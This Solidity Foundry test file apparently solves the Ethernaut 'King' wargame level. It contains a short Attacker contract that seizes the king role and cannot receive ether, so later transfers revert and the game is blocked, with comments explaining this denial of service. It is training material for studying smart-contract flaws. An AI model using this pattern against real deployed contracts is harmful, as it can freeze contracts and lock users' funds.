// SPDX-License-Identifier: Unlicense
pragma solidity >=0.6.0;
pragma experimental ABIEncoderV2;

import "./utils/BaseTest.sol";
import "src/levels/King.sol";
import "src/levels/KingFactory.sol";

contract TestKing is BaseTest {
    King private level;

    constructor() public {
        // SETUP LEVEL FACTORY
        levelFactory = new KingFactory();
    }

    function setUp() public override {
        // Call the BaseTest setUp() function that will also create testsing accounts
        super.setUp();
    }

    function testRunLevel() public {
        runLevel();
    }

    function setupLevel() internal override {
        /** CODE YOUR SETUP HERE */

        levelAddress = payable(this.createLevelInstance{value: 0.001 ether}(true));
        level = King(levelAddress);

        // Check that the contract is correctly setup
        assertEq(level._king(), address(levelFactory));
    }

    function exploitLevel() internal override {
        /** CODE YOUR EXPLOIT HERE */

        vm.startPrank(player);

        // King contract is sending ether to the old king using "transfer" method
        // If the old king is a smart contract and if it doesn't have a fallback or a receive fn
        // then the txn to be new king would revert, preventing anyone from becoming the new king

        // The current king is a smart contract without the ability to receive ether which means
        // that the king contract became the victim of DOS attack
        Attacker attacker = new Attacker{value: 1 ether}(address(level));

        assertEq(level._king(), address(attacker));

        vm.stopPrank();
    }
}

contract Attacker {
    constructor(address _level) public payable {
        (bool success, ) = _level.call{value: msg.value}("");
        require(success, "Transaction failed");
    }
}
